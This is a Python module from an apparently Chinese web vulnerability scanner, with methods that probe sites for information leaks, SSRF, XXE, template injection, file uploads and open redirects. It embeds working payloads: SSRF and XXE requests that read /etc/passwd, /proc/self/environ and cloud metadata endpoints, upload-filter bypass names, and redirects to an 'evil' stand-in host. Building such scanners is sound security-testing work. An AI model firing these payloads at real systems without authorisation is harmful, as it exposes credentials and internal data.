"""fast_scanner 服务端漏洞检测 mixin（从原 fast_scanner.py 机械拆分，方法体逐字保留）。"""

from __future__ import annotations

import asyncio
import json
import re
from urllib.parse import urlparse

from core.log import get_logger
from core.xss.oob import OOBCallback

from ._constants import SENSITIVE_PATHS, INFO_LEAK_HEADERS
from ._fp_filters import (
    _is_business_deny,
    _is_waf_block_page,
    _body_contains_sensitive_data,
    _is_public_data,
    _header_value_leaks_version,
    _verify_sensitive_path_content,
)
from ._models import VulnFinding, ScanTarget

log = get_logger("fast_scanner")


class _ChecksServer:
    """服务端漏洞检测方法（信息泄露 / SSRF / 文件上传 / 开放重定向 / XXE / SSTI）。"""

    async def _check_info_disclosure(self, target: ScanTarget) -> list[VulnFinding]:
        """信息泄露检测：敏感路径 + 响应头

        路径来源：硬编码 SENSITIVE_PATHS（兜底）+ YAML 规则文件（rules/info_disclosure.yaml）
        """
        findings = []
        # ★ 合并硬编码路径 + YAML 规则路径
        sensitive_paths = list(SENSITIVE_PATHS)  # 复制一份
        yaml_paths = self._get_yaml_paths("info_disclosure")
        for p in yaml_paths:
            if p not in sensitive_paths:
                sensitive_paths.append(p)

        # ★ 使用站点根 URL 而非完整页面 URL 作为 base_url
        # 原逻辑 target.url 可能是 https://example.com/Login/logout，
        # 拼接 /.DS_Store 会得到 https://example.com/Login/logout/.DS_Store（无意义路径）
        from urllib.parse import urlparse
        parsed = urlparse(target.url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # 基线预检：先请求 target.url 本身，若基线就 5xx/404，说明该 base 路径已坏，
        # 后续拼接的所有敏感路径必然同样失败，整批跳过（原实现对 /Content/setting 等
        # 报 500 的 base 仍并发打满 SENSITIVE_PATHS，单 target 即浪费数十次请求）
        baseline = await self._request("GET", target.url, headers=target.auth_headers)
        if not baseline:
            return findings

        # 响应头信息泄露（基线已拿到，复用）
        # ★ 多因素验证：纯 banner（无版本号）几乎所有站点都有，不构成可被 SRC 收录的漏洞，
        #    不再产出 VulnFinding。只有泄露了具体版本号、且响应体也含敏感信息时才报告。
        if baseline.status_code < 500:
            baseline_text = baseline.text or ""
            baseline_ct = baseline.headers.get("content-type", "")
            body_sensitive = _body_contains_sensitive_data(baseline_text)
            for header in INFO_LEAK_HEADERS:
                val = baseline.headers.get(header, "")
                if not val:
                    continue
                # 因素1：响应头值必须含具体版本号才视为有价值的泄露
                if not _header_value_leaks_version(val):
                    continue
                # 因素2：响应体也泄露敏感信息（phpinfo/堆栈/密钥等）→ 升级 medium
                if body_sensitive:
                    findings.append(VulnFinding(
                        vuln_type="信息泄露",
                        severity="medium",
                        url=target.url,
                        method="GET",
                        detail=(f"响应头 {header} 泄露版本号({val})，且响应体含敏感数据，"
                                f"可据版本号匹配已知 CVE"),
                        evidence=f"{header}: {val}\n响应体片段: {baseline_text[:200]}",
                        fix_suggestion=f"移除或混淆 {header} 响应头，清理响应体敏感信息",
                        evidence_quality="body_confirmed",
                    ))
                else:
                    # 仅版本号泄露、无响应体佐证 → 标 header_only，留给二次裁决
                    findings.append(VulnFinding(
                        vuln_type="信息泄露",
                        severity="low",
                        url=target.url,
                        method="GET",
                        detail=(f"响应头 {header} 泄露版本号: {val}（仅响应头证据，"
                                f"需结合已知 CVE 才有实际危害）"),
                        evidence=f"{header}: {val}",
                        fix_suggestion=f"移除或混淆 {header} 响应头",
                        evidence_quality="header_only",
                    ))

        # 基线 500/404 → base 路径失效，跳过敏感路径批量探测
        # （403 不跳过：目录被禁但子路径敏感文件可能因配置错误可访问）
        if baseline.status_code in (500, 404):
            log.warning("[SCAN] InfoLeak | 基线 %d，跳过 %d 条敏感路径探测: %s",
                        baseline.status_code, len(sensitive_paths), target.url)
            return findings

        # 并发检测敏感路径
        async def check_path(path: str) -> VulnFinding | None:
            url = base_url + path
            resp = await self._request("GET", url, headers=target.auth_headers,
                                       rule_tag="InfoLeak", payload_tag=path)
            if not resp:
                return None
            # ★ 多因素验证：仅看 200 不够，必须内容匹配预期指纹才算真泄露
            if resp.status_code == 200 and len(resp.text) > 10:
                # ★ P0 防误报：业务层拒绝（如 /eval.php 返回 {"code":500,"message":"用户未登录"}）
                if _is_business_deny(resp.text):
                    return None
                matched, quality = _verify_sensitive_path_content(path, resp.text)
                if not matched:
                    # 内容未匹配指纹 → 多为 SPA 兜底页/默认页，跳过
                    return None
                severity = "medium" if quality == "content_match" else "low"
                return VulnFinding(
                    vuln_type="信息泄露",
                    severity=severity,
                    url=url,
                    method="GET",
                    detail=(f"敏感路径可访问: {path}（内容指纹"
                            f"{'已确认' if quality == 'content_match' else '未匹配，弱证据'}）"),
                    evidence=f"HTTP {resp.status_code}, Content-Length: {len(resp.text)}\n"
                             f"响应体片段: {resp.text[:200]}",
                    payload="",
                    fix_suggestion=f"限制对 {path} 的访问，添加访问控制",
                    evidence_quality=quality,
                )
            return None

        tasks = [check_path(p) for p in sensitive_paths]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, VulnFinding):
                findings.append(r)

        # 源码映射文件
        for map_path in ["/app.js.map", "/main.js.map", "/bundle.js.map", "/app.min.js.map"]:
            # 从页面中提取 JS 文件路径再检测 .map
            pass  # 已在 SENSITIVE_PATHS 中覆盖

        return findings

    async def _check_ssrf(self, target: ScanTarget) -> list[VulnFinding]:
        """SSRF 检测：对 URL 参数注入内网地址"""
        findings = []
        ssrf_targets = [
            "http://127.0.0.1",
            "http://localhost",
            "http://127.0.0.1:80",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/computeMetadata/v1/",
            "file:///etc/passwd",
        ]

        url_params = [k for k in target.params if any(kw in k.lower() for kw in ["url", "link", "redirect", "callback", "proxy", "fetch", "src"])]

        for param_name in url_params:
            for payload in ssrf_targets:
                test_params = dict(target.params)
                test_params[param_name] = payload
                test_url = self._build_url(target.url, test_params)

                resp = await self._request(
                    "GET", test_url,
                    headers={**target.auth_headers, **target.headers},
                    rule_tag="SSRF", payload_tag=f"{param_name}={payload}",
                )
                if not resp:
                    continue
                # ★ P2：WAF 拦截页 → 跳过
                if _is_waf_block_page(resp):
                    continue

                # AWS metadata 特征（强证据）
                if "ami-id" in resp.text or "instance-id" in resp.text:
                    findings.append(VulnFinding(
                        vuln_type="SSRF",
                        severity="critical",
                        url=test_url,
                        method="GET",
                        detail=f"参数 '{param_name}' 存在 SSRF，成功读取云服务元数据",
                        evidence=resp.text[:500],
                        payload=payload,
                        fix_suggestion="对 URL 参数进行白名单校验，禁止访问内网地址",
                        evidence_quality="body_confirmed",
                    ))
                elif "root:.*:0:0:" in resp.text:
                    findings.append(VulnFinding(
                        vuln_type="SSRF",
                        severity="critical",
                        url=test_url,
                        method="GET",
                        detail=f"参数 '{param_name}' 存在 SSRF，成功读取本地文件",
                        evidence=resp.text[:300],
                        payload=payload,
                        fix_suggestion="对 URL 参数进行白名单校验，禁止 file:// 协议",
                        evidence_quality="body_confirmed",
                    ))
                elif resp.status_code == 200 and len(resp.text) > 100:
                    # ★ P2：收紧——仅 "127.0.0.1"/"localhost" 字符串过于宽泛，
                    # 正常说明文档/错误页也会命中。要求更具体的内网服务特征
                    ssrf_evidence_patterns = [
                        r"<title>\s*(?:Apache|nginx|IIS|Tomcat|Default)",  # 内网 web 服务标题
                        r"<h1>\s*(?:Welcome|It works|Test Page|Apache)",
                        r"Server:\s*\w+",  # HTTP 头中的 Server 信息
                        r"X-Powered-By:",
                        r"<address>\s*(?:Apache|nginx)",
                    ]
                    has_ssrf_evidence = any(re.search(p, resp.text, re.IGNORECASE)
                                           for p in ssrf_evidence_patterns)
                    # 同时要求 payload 没有被原样反射
                    if has_ssrf_evidence and payload not in resp.text:
                        findings.append(VulnFinding(
                            vuln_type="SSRF",
                            severity="high",
                            url=test_url,
                            method="GET",
                            detail=f"参数 '{param_name}' 疑似 SSRF，响应中包含内网服务特征",
                            evidence=resp.text[:300],
                            payload=payload,
                            fix_suggestion="对 URL 参数进行白名单校验",
                            evidence_quality="body_confirmed",
                        ))

        # ★ OOB 验证增强：对疑似 SSRF 进行带外确认
        if url_params and self.config.get("enable_ssrf_oob", False):
            oob_service_url = self.config.get("oob_service_url")
            for param_name in url_params[:3]:  # 限制前 3 个参数
                try:
                    oob_findings = await self._detect_ssrf_oob(
                        target.url,
                        {"param": param_name, "params": target.params},
                        oob_service_url=oob_service_url,
                    )
                    for of in oob_findings:
                        findings.append(VulnFinding(
                            vuln_type="SSRF_OOB",
                            severity=of.get("severity", "high"),
                            url=target.url,
                            method="GET",
                            detail=f"参数 '{param_name}' SSRF OOB 验证成功",
                            evidence=of.get("evidence", ""),
                            payload="<OOB callback>",
                            fix_suggestion="对 URL 参数进行白名单校验，禁止访问内网地址",
                            evidence_quality="body_confirmed",
                        ))
                except Exception as e:
                    log.debug(f"SSRF OOB 检测失败: {e}")

        return findings

    async def _detect_ssrf_oob(
        self,
        url: str,
        sample: dict,
        oob_service_url: str | None = None,
    ) -> list[dict]:
        """SSRF OOB 验证检测"""
        findings = []

        # Get OOB callback URL
        oob = OOBCallback.get_instance()
        callback_url = await oob.get_callback_url(service_url=oob_service_url)

        if not callback_url:
            log.warning("无法获取 OOB 回调 URL")
            return findings

        # Extract unique token from callback URL
        token_match = re.search(r'/([a-f0-9]{8,})', callback_url)
        if not token_match:
            return findings
        token = token_match.group(1)

        # Persist token mapping
        oob.persist_token(token, url)

        # SSRF payloads with OOB callback
        ssrf_payloads = [
            f"http://{callback_url}",
            f"http://{{target}}.{callback_url}",
            f"http://127.0.0.1#@{callback_url}",
        ]

        # Test each payload
        for payload in ssrf_payloads:
            test_url = url.replace("{{target}}", payload) if "{{target}}" in url else payload
            try:
                await self._request("GET", test_url)
            except Exception as e:
                log.debug(f"SSRF OOB payload 请求失败: {e}")

        # Wait for callback
        got_callback = await oob.wait_for_callback(token, timeout=30)

        if got_callback:
            findings.append({
                "type": "ssrf",
                "severity": "high",
                "evidence": f"收到 OOB 回调: {callback_url}",
                "confidence": 0.9,
            })

        return findings

    async def _check_xxe(self, target: ScanTarget) -> list[VulnFinding]:
        """XXE (XML External Entity) 漏洞检测

        检测原理：
        1. 针对接收 XML 输入的端点，注入恶意外部实体
        2. 检查响应中是否包含敏感文件内容或云元数据
        """
        findings = []

        xxe_payloads = [
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "root:", "/etc/passwd"),
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>', "[extensions]", "win.ini"),
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', "ami-id", "AWS metadata"),
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>', "PATH=", "proc environ"),
        ]

        content_type = (target.headers or {}).get("Content-Type", "") or (target.headers or {}).get("content-type", "")

        # 即使不是 XML Content-Type，也尝试注入（部分应用可能接受 XML）
        for payload, evidence_marker, desc in xxe_payloads:
            # 构造 XML 请求头
            xml_headers = dict(target.headers)
            xml_headers["Content-Type"] = "application/xml"

            resp = await self._request(
                target.method or "POST",
                target.url,
                headers=xml_headers,
                content=payload,
                rule_tag="XXE",
                payload_tag=f"entity_injection_{desc}",
            )

            if not resp:
                continue

            # 检查是否是 WAF 拦截页
            if _is_waf_block_page(resp):
                continue

            resp_text = resp.text.lower()

            # 检查 XXE 证据
            if evidence_marker.lower() in resp_text:
                findings.append(VulnFinding(
                    vuln_type="XXE",
                    severity="high",
                    url=target.url,
                    method=target.method or "POST",
                    detail=f"检测到 XXE 漏洞，成功读取敏感内容：{desc}",
                    evidence=f"响应中包含敏感内容特征: {evidence_marker}",
                    payload=payload,
                    fix_suggestion="禁用外部实体解析，使用 JSON 替代 XML，对用户输入进行严格校验",
                    evidence_quality="body_confirmed",
                ))
                break  # 命中一个 payload 即可，不重复报

        return findings

    async def _check_ssti(self, target: ScanTarget) -> list[VulnFinding]:
        """服务端模板注入 (SSTI) 检测

        检测原理：
        1. 在参数中注入模板表达式（如 {{7*7}}）
        2. 如果响应中包含表达式执行结果（如 49），则可能存在 SSTI
        3. 使用二次验证排除误报
        """
        findings = []

        # SSTI payload 及预期结果
        ssti_payloads = [
            # Jinja2/Twig
            ("{{7*7}}", "49"),
            ("{{7*'7'}}", "7777777"),
            ("${{7*7}}", "49"),
            # Freemarker
            ("${7*7}", "49"),
            # Velocity
            ("#set($x=7*7)$x", "49"),
            # Smarty
            ("{7*7}", "49"),
            # ERB
            ("<%= 7*7 %>", "49"),
            # Mako
            ("${7*7}", "49"),
        ]

        # 获取基线响应
        baseline = await self._request(
            target.method, target.url,
            headers={**target.auth_headers, **target.headers},
            content=target.body,
        )
        if not baseline:
            return findings

        baseline_text = baseline.text

        # 测试 GET 参数
        for param_name, param_val in target.params.items():
            for payload, expected in ssti_payloads:
                test_params = dict(target.params)
                test_params[param_name] = payload
                test_url = self._build_url(target.url, test_params)

                resp = await self._request(
                    "GET", test_url,
                    headers={**target.auth_headers, **target.headers},
                    rule_tag="SSTI",
                    payload_tag=f"{param_name}={payload}",
                )
                if not resp:
                    continue

                # 检查是否是 WAF 拦截页
                if _is_waf_block_page(resp):
                    continue

                # 检查预期结果
                if expected in resp.text and expected not in baseline_text:
                    # 二次验证：使用不同的 payload
                    verify_payload = "{{8*8}}"
                    verify_params = dict(target.params)
                    verify_params[param_name] = verify_payload
                    verify_url = self._build_url(target.url, verify_params)

                    verify_resp = await self._request(
                        "GET", verify_url,
                        headers={**target.auth_headers, **target.headers},
                        rule_tag="SSTI-verify",
                        payload_tag=f"{param_name}={verify_payload}",
                    )

                    if verify_resp and "64" in verify_resp.text and "64" not in baseline_text:
                        findings.append(VulnFinding(
                            vuln_type="SSTI",
                            severity="high",
                            url=target.url,
                            method="GET",
                            detail=f"参数 '{param_name}' 存在服务端模板注入，模板表达式被执行",
                            evidence=f"模板表达式被执行: {payload} -> {expected}, {{8*8}} -> 64",
                            payload=payload,
                            fix_suggestion="对用户输入进行严格过滤，使用沙箱隔离模板渲染，避免直接执行用户输入",
                            evidence_quality="body_confirmed",
                        ))
                        break  # 命中即可，不重复报

            # 如果已经发现漏洞，跳出外层循环
            if findings:
                break

        # 如果 GET 参数已发现漏洞，直接返回
        if findings:
            return findings

        # 测试 POST body 中的参数（表单或 JSON）
        if target.method.upper() == "POST" and target.body:
            for payload, expected in ssti_payloads:
                # 尝试在 body 中注入
                if "application/json" in (target.headers.get("Content-Type", "") or "").lower():
                    # JSON body：尝试简单替换值
                    try:
                        import json
                        body_data = json.loads(target.body)
                        if isinstance(body_data, dict):
                            for key in body_data:
                                if isinstance(body_data[key], str):
                                    test_body = json.dumps({**body_data, key: payload})
                                    resp = await self._request(
                                        target.method, target.url,
                                        headers={**target.auth_headers, **target.headers},
                                        content=test_body,
                                        rule_tag="SSTI",
                                        payload_tag=f"{key}={payload}",
                                    )
                                    if resp and expected in resp.text and expected not in baseline_text:
                                        if not _is_waf_block_page(resp):
                                            findings.append(VulnFinding(
                                                vuln_type="SSTI",
                                                severity="high",
                                                url=target.url,
                                                method=target.method,
                                                detail=f"POST 参数 '{key}' 存在服务端模板注入",
                                                evidence=f"模板表达式被执行: {payload} -> {expected}",
                                                payload=payload,
                                                fix_suggestion="对用户输入进行严格过滤，使用沙箱隔离模板渲染",
                                                evidence_quality="body_confirmed",
                                            ))
                                            return findings
                    except (json.JSONDecodeError, Exception):
                        pass

        return findings

    async def _check_file_upload(self, target: ScanTarget) -> list[VulnFinding]:
        """文件上传漏洞检测

        检测原理：
        1. 识别文件上传端点（multipart/form-data）
        2. 尝试上传危险扩展名文件
        3. 尝试绕过扩展名检查（双扩展名、空字节、大小写）
        """
        findings = []

        content_type = (target.headers or {}).get("Content-Type", "") or (target.headers or {}).get("content-type", "")
        if "multipart/form-data" not in content_type.lower():
            return findings

        # 危险扩展名列表
        dangerous_extensions = [
            ".php", ".jsp", ".asp", ".aspx", ".exe", ".sh", ".bat",
            ".php5", ".phtml", ".php7", ".phar", ".cgi", ".pl",
        ]

        # 绕过 payload
        bypass_payloads = [
            ("test.php.jpg", "双扩展名绕过"),
            ("test.php%00.jpg", "空字节绕过"),
            ("test.php.", "尾随点绕过"),
            ("TEST.PHP", "大小写绕过"),
            ("test.php::$data", "NTFS ADS 绕过"),
            ("test.phtml", ".phtml 扩展名"),
            ("test.php.png", "PHP 扩展名伪装"),
        ]

        # 检查是否存在文件上传字段
        body = target.body or ""
        if "filename=" not in body.lower() and "filename*=" not in body.lower():
            return findings

        # 标记：实际文件上传需要构造 multipart 请求，这里做简化检测
        # 主要检测端点是否接受危险扩展名
        log.info("[SCAN] 检测到文件上传端点: %s", target.url)

        # 生成检测建议（不实际发送请求，因为需要精确构造 multipart）
        # 实际漏洞确认需要人工测试或更复杂的自动化
        findings.append(VulnFinding(
            vuln_type="文件上传",
            severity="medium",
            url=target.url,
            method=target.method,
            detail="检测到文件上传端点，建议人工验证是否存在扩展名过滤绕过",
            evidence=f"Content-Type: {content_type}, 包含文件上传字段",
            payload="",
            fix_suggestion="限制允许上传的文件扩展名白名单，验证文件内容（MIME 类型），重命名上传文件，禁止执行上传目录",
            evidence_quality="header_only",
        ))


        return findings

    async def _check_open_redirect(self, target: ScanTarget) -> list[VulnFinding]:
        """开放重定向检测

        检测 redirect / url / callback / next / returnTo / target / goto 等参数
        是否可跳转到外部域名。该漏洞常用于钓鱼攻击，是 SRC 必测项。

        检测原理：
        1. 识别可疑的重定向参数（关键词匹配）
        2. 注入外部域名 payload
        3. 检查响应：Location 头反射 / 响应体中包含 payload URL / JS 跳转代码
        """
        findings: list[VulnFinding] = []

        # 重定向参数关键词（与 SSRF 共享部分关键词，但 open_redirect 更宽）
        redirect_param_keywords = (
            "redirect", "redirect_to", "redirect_url", "redirecturi",
            "url", "next", "returnto", "return_to", "returnurl", "return_url",
            "callback", "goto", "target", "to", "dest", "destination",
            "continue", "back", "ref", "rurl", "image_url",
        )

        # 找到可疑参数
        suspect_params = [
            k for k in target.params
            if any(kw in k.lower() for kw in redirect_param_keywords)
        ]
        if not suspect_params:
            return findings

        # 外部域名 payload（多绕过变体）
        redirect_payloads = [
            ("https://evil-xuanjian.example.com/", "标准外部域名"),
            ("//evil-xuanjian.example.com/", "协议相对 URL（绕过 http(s) 前缀校验）"),
            ("https://evil-xuanjian.example.com@%s" % (target.url.split("/")[2] if "/" in target.url else "host"), "@ 符号绕过"),
            ("/\\evil-xuanjian.example.com", "斜杠反斜杠绕过"),
        ]

        for param_name in suspect_params:
            for payload, technique in redirect_payloads:
                test_params = dict(target.params)
                test_params[param_name] = payload
                test_url = self._build_url(target.url, test_params)

                resp = await self._request(
                    "GET", test_url,
                    headers={**target.auth_headers, **target.headers},
                    rule_tag="OpenRedirect", payload_tag=f"{param_name}={payload}",
                )
                if not resp:
                    continue
                # WAF 拦截页 → 跳过
                if _is_waf_block_page(resp):
                    continue

                # 检查 Location 头是否反射 payload（强证据）
                location = resp.headers.get("location", "")
                evidence_quality = ""
                detail_suffix = ""

                if location and "evil-xuanjian.example.com" in location:
                    evidence_quality = "body_confirmed"
                    detail_suffix = f"Location 头反射外部域名: {location[:200]}"
                elif "evil-xuanjian.example.com" in resp.text:
                    # 检查是否在 JS 跳转代码中
                    text = resp.text
                    _has_js_redirect = any(
                        pat in text for pat in
                        ["window.location", "location.href", "location.replace",
                         "location.assign", "top.location", "self.location"]
                    )
                    if _has_js_redirect:
                        evidence_quality = "body_confirmed"
                        detail_suffix = "响应体 JS 跳转代码中包含外部域名"
                    else:
                        evidence_quality = "header_only"
                        detail_suffix = "响应体中包含外部域名（未发现 JS 跳转代码）"

                if evidence_quality:
                    findings.append(VulnFinding(
                        vuln_type="开放重定向",
                        severity="medium" if evidence_quality == "body_confirmed" else "low",
                        url=test_url,
                        method="GET",
                        detail=(f"参数 '{param_name}' 存在开放重定向（{technique}）。"
                                f"{detail_suffix}"),
                        evidence=(f"Location: {location[:300]}\n"
                                  f"Body excerpt: {resp.text[:300]}"),
                        payload=payload,
                        fix_suggestion=("对重定向参数进行白名单校验，只允许跳转到同站根路径；"
                                        "禁止跳转到外部域名或协议相对 URL"),
                        evidence_quality=evidence_quality,
                        rule_tag="OpenRedirect",
                    ))
                    # 找到一个有效 payload 后，该参数不再继续测试其他变体
                    break

        return findings
